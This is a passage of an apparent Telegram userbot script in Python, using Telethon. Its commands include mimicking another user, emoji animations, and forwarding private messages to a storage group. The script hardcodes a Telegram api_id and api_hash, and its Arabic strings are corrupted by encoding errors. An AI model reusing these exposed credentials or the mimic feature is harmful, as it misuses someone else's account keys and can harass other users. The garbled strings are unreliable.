from telethon.sync import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.errors.rpcerrorlist import MessageNotModifiedError, FloodWaitError
from telethon.tl.types import ChannelParticipantCreator, ChannelParticipantAdmin
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChatBannedRights
from telethon.errors import UserAdminInvalidError, ChatAdminRequiredError
from telethon import events, functions
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.tl.types import User
from telethon.types import InputWebDocument
from telethon.errors import MediaEmptyError, WebpageMediaEmptyError, WebpageCurlFailedError
from telethon.tl.functions.photos import GetUserPhotosRequest
from sqlalchemy import Column, Integer, String
from telethon.tl.types import InputMessagesFilterDocument
from telethon.utils import get_input_photo
from telethon import functions, events
from telethon.tl.functions.messages import EditMessageRequest
from telethon.tl.types import ChannelParticipantsAdmins, UserStatusEmpty, UserStatusLastMonth, UserStatusLastWeek, UserStatusRecently, UserStatusOnline
from telethon.tl.types import InputPeerUser, InputPeerChannel
from telethon.errors.rpcerrorlist import PeerIdInvalidError
from pySmartDL import SmartDL
from telethon.tl.types import MessageActionChannelMigrateFrom
from telethon import events, Button
from queue import Queue
from telethon.sync import functions
from telethon.tl.types import InputChatUploadedPhoto
from user_agent import generate_user_agent
from threading import Thread
from telethon.tl.functions.messages import ReportSpamRequest
from telethon import types
from telethon.tl import functions
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon import events, functions
from telethon.tl.types import Message
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.events import NewMessage
from telethon import events 
from telethon.tl.types import InputPeerChat
from telethon import errors
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.types import MessageMediaPhoto
from telethon.tl.types import MessageMediaDocument
import pybase64
from telethon import events, functions, utils
from telethon.tl import functions, types
from telethon.tl.types import MessageEntityMentionName
from telethon.errors import ChatAdminRequiredError
from telethon.tl.types import InputChannel
from deep_translator import GoogleTranslator
from telethon import TelegramClient, events
from telethon.tl.types import ChannelParticipantsAdmins        
from telethon.errors import ChannelInvalidError
from langdetect import detect  
from telethon.tl.types import ChannelParticipantsSearch
from telethon.tl.functions.channels import EditTitleRequest
from datetime import datetime
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.photos import DeletePhotosRequest
from telethon.errors.rpcerrorlist import (
    StickerMimeInvalidError, 
    PhotoExtInvalidError, 
    PhotoCropSizeSmallError, 
    ImageProcessFailedError )
from telethon import TelegramClient, events
from telethon import TelegramClient, events, sync 
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from googletrans import LANGUAGES
from sqlalchemy import create_engine, Column, Integer, String
from sqlalchemy.ext.declarative import declarative_base
from gpytranslate import Translator
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.types import InputPhoto
from telethon.tl.functions.channels import EditPhotoRequest
from googletrans import Translator
from telethon import events
from telethon import functions
from telethon.tl.functions.messages import GetFullChatRequest
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.errors.rpcerrorlist import MessageIdInvalidError
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from datetime import datetime
from sqlalchemy import create_engine
from telethon.tl.types import InputMessagesFilterDocument, InputMessagesFilterPhotos
from asyncio import sleep
from sqlalchemy.orm import sessionmaker
from datetime import datetime, timedelta
from telethon.tl.types import Channel, Chat
from dateutil import tz
from emoji import emojize
from datetime import datetime
from telethon.tl.custom import Button
from math import sqrt
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.errors.rpcerrorlist import WebpageMediaEmptyError
from telethon.tl.functions.messages import DeleteMessagesRequest
import sys
import pytz
import asyncio
import os
import datetime as dt
import base64
import events
import platform
from telethon import version as telethon_version
from telethon import events
from ping3 import ping
import pickle
import string
import re
import json
import mention
import requests
import io
import aiohttp
import random
import threading
import html
import telethon
import logging
import shutil
import time
os.system("clear")
print("""\033[031m
‚†Ä‚†Ä‚†Ä‚††‚£§‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£§‚£§‚†§‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚¢à‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£Ö‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚¢†‚£¥‚£ø‚°ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚†ø‚£ø‚£∑‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚¢Ä‚£¥‚£ø‚°∑‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ª‚£ø‚£ø‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚£æ‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£∑‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚£ø‚£ø‚£ø‚£ß‚†Ä‚†Ä‚†Ä‚†ò‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚°á‚†Ä‚†Ä‚†Ä‚¢Ä‚£º‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†π‚£ø‚£ø‚£ø‚£∑‚£¶‚£Ñ‚°Ä‚£ø‚£±‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚¢ø‚£ß‚£†‚£¥‚£æ‚£ø‚£ø‚£ø‚£ø‚°ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†à‚†õ‚¢∑‚£ø‚£ü‚°ø‚†ø‚†ø‚°ü‚£ì‚£í‚£õ‚°õ‚°õ‚¢ü‚£õ‚°õ‚†ü‚†ø‚£ª‚¢ø‚£ø‚£ª‚°ø‚†õ‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚¢†‚£¥‚¢ª‚°≠‚†ñ‚°â‚†•‚£à‚†Ä‚£ê‚†Ç‚°Ñ‚†î‚¢Ç‚¢¶‚°π‚¢¨‚°ï‚†ä‚†≥‚†à‚¢ø‚£≥‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚¢Ä‚£º‚£∑‚£ã‚†≤‚¢Æ‚£Å‚†Ä‚£ê‚†Ü‚°§‚¢ä‚£ú‚°Ä‚°æ‚£Ä‚†Ä‚¢†‚¢ª‚£å‚£§‚£•‚£ì‚£å‚¢ª‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚¢∞‚£ü‚£Ω‚¢≥‚£Ø‚£ù‚£¶‚°Ä‚†ì‚°§‚¢Ü‚†á‚†Ç‚†Ñ‚†§‚°ù‚£Ç‚†ã‚†ñ‚¢ã‚†Ä‚£°‚£∂‚£æ‚°ø‚°∑‚£Ω‚°ø‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚¢∏‚£ø‚°ú‚¢Ø‚£ø‚£ø‚£ø‚£∑‚£ø‚£§‚£ß‚£∂‚£¨‚£ù‚£É‚£ì‚£à‚£•‚£∂‚£ø‚£æ‚£ø‚£ø‚¢£‚†á‚¢ª‚°û‚£Ø‚£π‚†Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚¢ª‚£º‚£Ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ü‚°î‚°Ø‚¢ß‚¢ü‚£ü‚£±‚†ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£øùóòùó©ùóî ùó¶ùó¢ùó®ùó•ùóñùóò‚£ø‚£ø‚£ø‚£ø‚£ø‚°ü‚°º‚°º‚¢Å‚°å‚¢º‚°ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚£ø‚£º‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚£ø‚¢á‚°º‚¢É‚°ø‚£º‚£õ‚°ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚£ß‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ø‚†ü‚£°‚£´‚£¢‚¢è‚£º‚°µ‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚¢∏‚£ø‚£è‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚¢ø‚£ø‚°æ‚¢ï‚£ª‚£Ω‚£µ‚†ø‚†õ‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†ò‚¢∑‚£Æ‚£ø‚°º‚¢≠‚°ü‚†≥‚†û‚°ñ‚¢õ‚£∂‚£∑‚£Ø‚°∂‚†ü‚†õ‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†â‚†õ‚†õ‚†õ‚†ø‚†ü‚†õ‚†õ‚†ã‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Å‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä

ùêÉùêûùêØ:@X_54P
""")
api_id = '26107707'
api_hash = 'e3774389da1ff2e49f3cfb38c2105c87'
phone_number = input(": ")

session_name = 'Eva surce'
response_file = 'response.pkl'
published_messages_file = 'publishd_messages.pkl'
muted_users_file = 'muted_usrs.pkl'
time_update_status_file = 'tme_update_status.pkl'
channel_link_file = 'channel_link.pl'
image_folder = 'path_to_imagefolder'
response_file = 'path_to_respons_file'
last_message_time_file = 'path_to_last_messge_time_file'
last_message_id_file = 'path_to_last_mesage_id_file'
responses = {}
user_last_message_time = {}
user_last_message_id = {}
user_last_message_time_sent = {}
active_publishing_tasks = {}
image_folder = "imae"
if not os.path.exists(image_folder):
    os.makedirs(image_folder)

client = TelegramClient(session_name, api_id, api_hash)
client.start(phone_number)


if os.path.exists(response_file):
    with open(response_file, 'rb') as f:
        responses = pickle.load(f)
else:
    responses = {}

if os.path.exists(channel_link_file):
    with open(channel_link_file, 'rb') as f:
        channel_link = pickle.load(f)
else:
    channel_link = None


if os.path.exists(time_update_status_file):
    with open(time_update_status_file, 'rb') as f:
        time_update_status = pickle.load(f)
else:
    time_update_status = {'enabled': False}


if os.path.exists(muted_users_file):
    with open(muted_users_file, 'rb') as f:
        muted_users = pickle.load(f)
else:
    muted_users = {}



if os.path.exists(response_file):
    with open(response_file, 'rb') as f:
        responses = pickle.load(f)
else:
    responses = {}

if os.path.exists(published_messages_file):
    with open(published_messages_file, 'rb') as f:
        published_messages = pickle.load(f)
else:
    published_messages = []


active_timers = {}
countdown_messages = {}


image_path = 'local_image.jpg'


account_name = None

def insert_emojis(message, emojis):
    random.shuffle(emojis)
    message_list = list(message)
    emoji_positions = []
    
    for emoji in emojis:
        pos = random.choice(range(len(message_list)))
        while pos in emoji_positions:
            pos = random.choice(range(len(message_list)))
        
        emoji_positions.append(pos)
        message_list[pos] = emoji
    
    return ''.join(message_list)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖÿ™ÿ™'))
async def update_message(event):
    await event.delete()
    message_text = ' ' * 6
    emojis = ['ü§£', 'üòÇ', 'üòπ', 'ü§£', 'üòÇ', 'üòπ']
    
    message = await event.respond('ü§£üòÇüòπü§£üòÇüòπ')
    
    last_message = ""
    start_time = asyncio.get_event_loop().time()
    duration = 5  
    
    while True:
        try:
            current_time = asyncio.get_event_loop().time()
            if current_time - start_time > duration:
                break
            
            emoji_string = insert_emojis(message_text, emojis)
            while emoji_string == last_message:
                emoji_string = insert_emojis(message_text, emojis)
            
            last_message = emoji_string
            await message.edit(emoji_string)
            
            await asyncio.sleep(0)

        except Exception as e:
            print(f"Error updating message: {e}")
            break


mimic_user_id = None


@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ŸÇŸÑŸäÿØ'))
async def set_mimic_user(event):
    global mimic_user_id
    if event.is_reply:
        
        reply_message = await event.get_reply_message()
        mimic_user_id = reply_message.sender_id
        await event.reply(f"‚éô ÿ≥Ÿäÿ™ŸÖ ÿ™ŸÇŸÑŸäÿØ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ {mimic_user_id}.")
        await event.delete()
    else:
        await event.reply("‚éô Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ¥ÿÆÿµ ÿßŸÑÿ∞Ÿä ÿ™ÿ±ŸäÿØ ÿ™ŸÇŸÑŸäÿØŸá.")


@client.on(events.NewMessage())
async def mimic_user(event):
    global mimic_user_id
    if mimic_user_id and event.sender_id == mimic_user_id:
        
        await client.send_message(event.chat_id, event.text)


@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ŸÇŸÑŸäÿØ'))
async def stop_mimic(event):
    global mimic_user_id
    mimic_user_id = None
    await event.reply("‚éâ‚ïéÿ™ŸÖ ÿßŸäŸÄŸÇŸÄÿßŸÅ ÿßŸÑŸÄÿ™ŸÄŸÇŸÄŸÑŸÄŸäŸÄÿØ .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è.")
    await event.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿ±ŸÅÿπ ŸÉŸäŸÉ'))
async def stop_mimic(event):
    global mimic_user_id
    mimic_user_id = None
    await event.reply("ÿ™ŸÖ ÿ±ŸÅÿπ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÉŸäŸäŸÉŸá.")
    await event.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÜÿ™ÿ≠ÿßÿ±'))
async def suicide_message(event):
    await event.delete()
    
    
    message = await event.respond("**ÿ¨ÿßÿ±Ÿä ÿßŸÑÿßŸÜÿ™ÿ≠ÿßÿ± .....**")
    
    
    await asyncio.sleep(3)
    
    
    final_message = (
        "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™ÿ≠ÿßÿ± ÿ®ŸÜÿ¨ÿßÿ≠üòÇ...\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄÔºèÔø£Ôø£Ôºº| \n"
        "Ôºú ¬¥ÔΩ• „ÄÄ„ÄÄ |Ôºº \n"
        "„ÄÄ|„ÄÄÔºì„ÄÄ | ‰∏∂Ôºº \n"
        "Ôºú „ÄÅÔΩ•„ÄÄ„ÄÄ|„ÄÄ„ÄÄÔºº \n"
        "„ÄÄÔººÔºøÔºøÔºè‚à™ _ ‚à™) \n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ Ôºµ Ôºµ"
    )
    
    await message.edit(final_message)

def insert_emojis(message, emojis):
    random.shuffle(emojis)
    message_list = list(message)
    emoji_positions = []
    
    for emoji in emojis:
        pos = random.choice(range(len(message_list)))
        while pos in emoji_positions:
            pos = random.choice(range(len(message_list)))
        
        emoji_positions.append(pos)
        message_list[pos] = emoji
    
    return ''.join(message_list)

@client.on(events.NewMessage(from_users='me', pattern='.ÿ¥ÿ±Ÿäÿ±'))
async def update_message(event):
    await event.delete()
    message_text = ' ' * 6
    emojis = ['üòà', 'üíÄ', 'üëø', 'üî™', '‚ò†Ô∏è', 'üëπ']
    
    message = await event.respond('üëøüíÄüëπüëøüî™‚ò†Ô∏è')
    
    last_message = ""
    start_time = asyncio.get_event_loop().time()
    duration = 5  
    
    while True:
        try:
            current_time = asyncio.get_event_loop().time()
            if current_time - start_time > duration:
                break
            
            emoji_string = insert_emojis(message_text, emojis)
            while emoji_string == last_message:
                emoji_string = insert_emojis(message_text, emojis)
            
            last_message = emoji_string
            await message.edit(emoji_string)
            
            await asyncio.sleep(0)

        except Exception as e:
            print(f"Error updating message: {e}")
            break

@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ'))
async def add_group(event):
    await event.delete()
    try:
        
        group_id = event.chat_id
        
        
        with open('group_id.pkl', 'wb') as f:
            pickle.dump(group_id, f)
        
        
        group = await client.get_entity(group_id)
        group_name = group.title
        group_type = "ŸÇŸÜÿßÿ©" if isinstance(group, Channel) else "ŸÖÿ¨ŸÖŸàÿπÿ©"

        
        await event.reply(f"‚éô ÿ™ŸÖ ÿ™ÿπŸäŸäŸÜ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿ•ŸÑŸâ: {group_name} ({group_type})")
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")


@client.on(events.NewMessage(incoming=True))
async def forward_private_message(event):
    
    if os.path.exists('group_id.pkl'):
        with open('group_id.pkl', 'rb') as f:
            group_id = pickle.load(f)
    else:
        group_id = None

    if event.is_private and not (await event.get_sender()).bot:
        if group_id:
            
            await client.forward_messages(group_id, event.message)

            
            sender = await event.get_sender()
            group_name = (await client.get_entity(group_id)).title
            timestamp = time.strftime("%H:%M")
            message_text = event.message.text or "ŸÑÿß ŸäŸàÿ¨ÿØ ŸÜÿµ ŸÑŸÑÿ±ÿ≥ÿßŸÑÿ©"
            user_mention = f"@{sender.username}" if sender.username else "ŸÑÿß ŸäŸàÿ¨ÿØ ŸÖÿπÿ±ŸÅ ŸÖÿ≥ÿ™ÿÆÿØŸÖ"

            info_message = (
                f"‚åî‚îä ŸÑÿØŸäŸÉ ŸÖŸÜÿ¥ŸÜ ŸÖŸÜ ÿßŸÑÿπÿ∂Ÿà: {sender.first_name}\n"  
                f"‚åî‚îä ÿßŸÑŸÉŸÄŸÄÿ±Ÿàÿ®: {group_name}\n"
                f"‚åî‚îä ÿßŸÑŸÄŸÄŸàŸÇŸÄŸÄÿ™: {timestamp}\n"
                f"‚åî‚îä ÿßŸÑÿ±ÿ≥ŸÄŸÄÿßŸÑŸÄŸá ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©: {message_text}\n"
                f"‚åî‚îä ÿßŸÑŸÖŸÄÿ±ÿ≥ŸÄŸÑ: {user_mention}"
            )
            await client.send_message(group_id, info_message)
        else:
            await event.reply("")


@client.on(events.NewMessage(incoming=True))
async def forward_group_message(event):
    
    if os.path.exists('group_id.pkl'):
        with open('group_id.pkl', 'rb') as f:
            group_id = pickle.load(f)
    else:
        group_id = None

    if event.is_group and group_id:
        
        if event.reply_to_msg_id:
            replied_message = await event.get_reply_message()
            reply_sender = await client.get_entity(replied_message.sender_id)
            bot_id = (await client.get_me()).id

            
            if replied_message.sender_id == bot_id:
                
                await client.forward_messages(group_id, event.message)

                
                sender = await event.get_sender()  
                group_name = (await client.get_entity(group_id)).title
                timestamp = time.strftime("%H:%M")
                message_text = event.message.text or "ŸÑÿß ŸäŸàÿ¨ÿØ ŸÜÿµ ŸÑŸÑÿ±ÿ≥ÿßŸÑÿ©"
                user_mention = f"@{sender.username}" if sender.username else "ŸÑÿß ŸäŸàÿ¨ÿØ ŸÖÿπÿ±ŸÅ ŸÖÿ≥ÿ™ÿÆÿØŸÖ"

                info_message = (
                    f"‚åî‚îä ŸÑÿØŸäŸÉ ŸÖŸÜÿ¥ŸÜ ŸÖŸÜ ÿßŸÑÿπÿ∂Ÿà: {sender.first_name}\n"  
                    f"‚åî‚îä ÿßÿ≥ŸÖ ÿßŸÑÿ¨ÿ±Ÿàÿ®: {group_name}\n"
                    f"‚åî‚îä ÿßŸÑŸàŸÇÿ™: {timestamp}\n"
                    f"‚åî‚îä ŸÜÿµ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©: {message_text}\n"
                    f"‚åî‚îä ÿßŸÑŸäŸàÿ≤ÿ±: {user_mention}"
                )
                await client.send_message(group_id, info_message)


signature = (
    " {response}\n\n"
)



if os.path.exists(response_file):
    with open(response_file, 'rb') as f:
        responses = pickle.load(f)


if os.path.exists(last_message_time_file):
    with open(last_message_time_file, 'rb') as f:
        user_last_message_time = pickle.load(f)


if os.path.exists(last_message_id_file):
    with open(last_message_id_file, 'rb') as f:
        user_last_message_id = pickle.load(f)


if os.path.exists('path_to_last_message_sent_time_file'):
    with open('path_to_last_message_sent_time_file', 'rb') as f:
        user_last_message_time_sent = pickle.load(f)


@client.on(events.NewMessage(from_users='me', pattern='.ÿ±ÿØ'))
async def add_response(event):
    await event.delete()
    try:
        photo_path = None

        
        if event.reply_to_msg_id:
            
            replied_message = await client.get_messages(event.chat_id, ids=event.reply_to_msg_id)
            
            
            if replied_message.photo:
                
                photo_path = os.path.join(image_folder, f"{event.reply_to_msg_id}.jpg")
                await client.download_media(replied_message, file=photo_path)

        
        if ' ' in event.raw_text:
            _, response = event.raw_text.split(' ', 1)
            response = response.strip()

            
            full_response = signature.format(response=response)

            
            responses['response'] = {
                'response': full_response,
                'photo': photo_path
